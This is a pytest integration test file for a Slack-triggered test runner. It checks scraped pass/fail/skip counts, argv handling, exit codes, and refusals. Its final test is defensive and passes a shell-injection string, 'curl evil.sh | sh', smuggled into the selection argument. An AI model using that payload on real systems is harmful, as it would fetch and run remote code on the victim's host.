"""V1's runner, against a real pytest, with counts decided in advance.

WHY THIS TIER EXISTS AT ALL

`runners/local.py` reports how many tests passed by SCRAPING PYTEST'S SUMMARY
LINE. The unit tier feeds `_counts` some strings and checks the arithmetic, and
the argv tests check the command it builds — but nothing ran it. Both halves can
be perfectly correct while the whole is wrong, because the thing joining them is
pytest's output format, which this project does not own. If that format changes,
the numbers posted to Slack become WRONG rather than absent, and every test in
the unit tier still passes.

The only way to catch that is to run a real pytest, over a real subprocess, and
compare what comes back to numbers written down somewhere else. That somewhere
else is `fixture_suite/webapp/test_known_outcomes.py`: **3 passed, 1 failed,
1 skipped**, on purpose, stated in its docstring.

WHAT IS REAL HERE AND WHAT IS NOT

Real: the subprocess, the pytest, the argv, the stdout, the parsing, the exit
code. Substituted: `SlackNotifier`, because the assertion needs the numbers as
numbers. Reading them back out of the dry-run console text would mean parsing
output to check output parsing, which is a test that can agree with a bug.

THE ZERO CASE IS A FAILURE, NOT A PASS
`_counts` returns `(0, 0, 0)` for anything it cannot read — the honest choice
for production, and a trap for a test, because a run that never happened and a
run whose output could not be parsed both come back as zeros. Every test below
asserts a positive total for exactly that reason.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from slack_runtests.runners import local

pytestmark = pytest.mark.integration

#: The runner resolves `{suite_root}/{product}` against `cwd`, and `uv run`
#: needs to be inside the project to find its environment, so the repository
#: root is the working directory — which is also what the API passes in
#: production (`cwd=Path.cwd()`).
REPO_ROOT = Path(__file__).resolve().parents[2]
SUITE_ROOT = "tests/integration/fixture_suite"

#: Written down here, and again in the fixture suite's docstring. Two places on
#: purpose: if they ever disagree, that is a failure rather than a silent
#: adjustment of the expected numbers to whatever came back.
EXPECTED_PASSED, EXPECTED_FAILED, EXPECTED_SKIPPED = 3, 1, 1


class RecordingNotifier:
    """Stands in for `SlackNotifier`, keeping the numbers as numbers.

    Same surface the runner uses, and it records rather than prints, so a test
    can assert on `finish(passed=..., failed=..., skipped=...)` directly instead
    of re-parsing the console fallback's text.
    """

    def __init__(self, channel: str | None = None, **_: object) -> None:
        self.channel = channel
        self.posts: list[str] = []
        self.finished: dict[str, float] | None = None

    def post(self, text: str, **_: object) -> None:
        self.posts.append(text)

    def start(self, text: str, **_: object) -> None:
        self.posts.append(text)

    def update(self, text: str, **_: object) -> None:
        self.posts.append(text)

    def progress(self, **_: object) -> None:
        pass

    def finish(self, *, passed: int, failed: int, skipped: int = 0,
               duration: float = 0.0, **_: object) -> None:
        self.finished = {
            "passed": passed, "failed": failed,
            "skipped": skipped, "duration": duration,
        }


@pytest.fixture
def slack(monkeypatch: pytest.MonkeyPatch) -> RecordingNotifier:
    recorder = RecordingNotifier()
    monkeypatch.setattr(local, "SlackNotifier", lambda *a, **k: recorder)
    return recorder


@pytest.fixture(autouse=True)
def no_stray_results_xml():
    """`--junit-xml=results.xml` is written relative to cwd — the repo root.

    It is gitignored, but a suite that leaves files in the working tree is a
    suite that makes `git status` unreliable, and a deploy-cleanliness check
    reads exactly that. Only remove what this test created.
    """
    artefact = REPO_ROOT / "results.xml"
    existed = artefact.exists()
    yield
    if artefact.exists() and not existed:
        artefact.unlink()


def counts(slack: RecordingNotifier) -> tuple[int, int, int]:
    assert slack.finished is not None, "the runner never reported a result to Slack"
    got = (slack.finished["passed"], slack.finished["failed"], slack.finished["skipped"])
    # THE INPUT-SET SIZE. Zeros are what `_counts` returns when it understood
    # nothing, so a zero total means this test proved nothing and must fail.
    assert sum(got) > 0, (
        "0 tests accounted for — the suite did not run, or its summary line "
        f"could not be parsed. Reported: {slack.finished}"
    )
    return got  # type: ignore[return-value]


# ── 1: the whole point ───────────────────────────────────────────────────────

def test_counts_scraped_from_a_real_pytest_match_the_known_outcome(slack) -> None:
    """3 passed, 1 failed, 1 skipped — decided in the fixture, not read off a run."""
    code = local.run(
        product="webapp",
        server="staging",
        select=None,
        marker=None,
        channel="#testing",
        suite_root=SUITE_ROOT,
        cwd=REPO_ROOT,
    )

    assert counts(slack) == (EXPECTED_PASSED, EXPECTED_FAILED, EXPECTED_SKIPPED)
    assert sum(counts(slack)) == 5, "five tests exist in the fixture suite"
    # Pytest's exit code, propagated unchanged. A wrapper that returned 0 on a
    # failing suite would make every gate built on it meaningless — and note
    # this run reports 3 passes WHILE failing, so the counts are not being
    # inferred from the exit code.
    assert code == 1


# ── 2: the argv really reaches pytest ────────────────────────────────────────

def test_a_selection_expression_with_spaces_narrows_the_real_run(slack) -> None:
    """`-k "beta or gamma"` arrives as ONE argument and selects two tests.

    This is the shell-injection property observed from the outside. Built as a
    list and passed with no shell, the expression stays one argv entry; split by
    a shell it would arrive as three, `or` and `gamma` would be read as paths,
    and pytest would fail to collect rather than run exactly two tests.
    """
    code = local.run(
        product="webapp",
        server="staging",
        select="beta or gamma",
        marker=None,
        channel="#testing",
        suite_root=SUITE_ROOT,
        cwd=REPO_ROOT,
    )

    # The deliberate failure and the skip are both deselected by the filter.
    assert counts(slack) == (2, 0, 0)
    assert code == 0


# ── 3: a green run is green ──────────────────────────────────────────────────

def test_an_all_passing_selection_exits_zero(slack) -> None:
    """The exit code is read, not assumed — proven in both directions with 1."""
    code = local.run(
        product="webapp",
        server="staging",
        select="alpha",
        marker=None,
        channel="#testing",
        suite_root=SUITE_ROOT,
        cwd=REPO_ROOT,
    )

    assert counts(slack) == (1, 0, 0)
    assert code == 0


# ── 4: the refusals happen before pytest is ever started ─────────────────────

def test_a_missing_suite_is_refused_without_running_anything(slack) -> None:
    """`webapp` exists; `nosuchproduct` does not, and says so instead of erroring."""
    code = local.run(
        product="nosuchproduct",
        server="staging",
        select=None,
        marker=None,
        channel="#testing",
        suite_root=SUITE_ROOT,
        cwd=REPO_ROOT,
    )

    assert code == 5
    assert slack.finished is None, "nothing ran, so nothing may be reported as a result"
    assert any("nothing to run" in text for text in slack.posts), slack.posts


def test_a_disallowed_expression_is_refused_by_the_runner_itself(slack) -> None:
    """Defence in depth: the parser already refused this, and so does the runner.

    `runners/local.py` is importable, and a future caller may not come through
    the Slack parser. The check has to hold on its own — this asserts it does,
    with no subprocess started.
    """
    code = local.run(
        product="webapp",
        server="staging",
        select='smoke"; curl evil.sh | sh; "',
        marker=None,
        channel="#testing",
        suite_root=SUITE_ROOT,
        cwd=REPO_ROOT,
    )

    assert code == 4
    assert slack.finished is None
    assert any("Refused" in text for text in slack.posts), slack.posts
